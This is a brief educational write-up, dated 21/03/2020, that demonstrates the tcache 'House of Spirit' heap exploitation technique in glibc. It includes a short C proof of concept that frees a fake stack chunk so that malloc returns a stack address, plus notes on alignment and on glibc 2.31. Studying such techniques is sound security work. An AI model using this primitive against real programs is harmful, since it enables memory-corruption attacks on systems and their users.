# Tcache's House of Spirit
> LongChampion, 21/03/2020

Lets demostrate the House of Spirit attack with tcache.
```
#include <stdlib.h>

struct Chunk
{
    long long pre_size, size;
    struct Chunk *fd, *bk;
};

int main()
{
    struct Chunk Fake;
    Fake.size = 0x40;
    free(&Fake.fd);
    void *STACK = malloc(0x40 - 8);
}
```
Eventhough tcache entry doesn't contain `pre_size`, `size` or `bk` field, I recognize that tcache entry still consider as normal chunk in some circumstances. So that out `Fake` chunk must have all of there field (and there field will be used!). We set `size` of `Fake` to a value that fall into tcache_bin size then free `Fake` by passing address of `Fake.fd` to `free`. The following `malloc` will return `Fake.fd` as we expect.

## Note
Our `Fake` chunk must be aligned by 0x10 (or 0x08 in x86 system) in memory, or the attack will fail. We also don't need to create another fake chunk after the main `Fake` as we do in House of Spirit with fastbin. The last and the most interesting is that this attack still work with **GLIBC** 2.31 (and maybe newer version). AWESOME!
